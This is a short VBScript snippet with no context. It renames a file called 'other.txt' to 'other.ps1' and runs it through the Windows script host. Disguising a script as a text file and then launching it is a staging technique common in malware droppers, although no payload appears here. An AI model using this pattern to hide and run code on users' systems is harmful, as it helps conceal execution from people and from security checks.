Set myFSO = CreateObject("Scripting.FileSystemObject")
myFSO.MoveFile "other.txt" , "other.ps1"
CreateObject("WScript.Shell").Run "other.ps1"